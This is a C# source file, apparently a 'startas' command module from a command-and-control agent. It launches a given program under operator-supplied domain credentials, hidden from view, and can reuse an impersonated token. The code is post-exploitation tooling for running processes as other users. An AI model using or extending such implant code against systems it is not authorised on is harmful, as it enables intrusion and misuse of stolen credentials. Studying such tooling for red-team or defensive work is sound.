using Agent.Helpers;
using Agent.Models;
using System;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class StartASCommand : AgentCommand
    {
        public override string Name => "startas";
        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            string usr = task.SplittedArgs[0];
            string password = task.SplittedArgs[1];

            var tab = usr.Split('\\');
            var username = tab[1];
            var domain = tab[0];

            var filename = task.SplittedArgs[2];
            //var args = task.SplittedArgs[3];
            //string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();

            ProcessCredentials creds = new ProcessCredentials()
            {
                Domain = domain,
                Username = username,
                Password = password,
            };

            var creationParms = new ProcessCreationParameters()
            {
                Command = filename /*+ " " + args*/,
                RedirectOutput = false,
                CreateNoWindow = true,
                CurrentDirectory = Environment.CurrentDirectory,
                Credentials = creds,
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
                creationParms.Token = ImpersonationHelper.ImpersonatedToken;

            var procResult = APIWrapper.CreateProcess(creationParms);

            if (procResult.ProcessId == 0)
            {
                context.Error("Process start failed!");
                return;
            }

            if (creationParms.RedirectOutput)
                APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
        }
    }
}
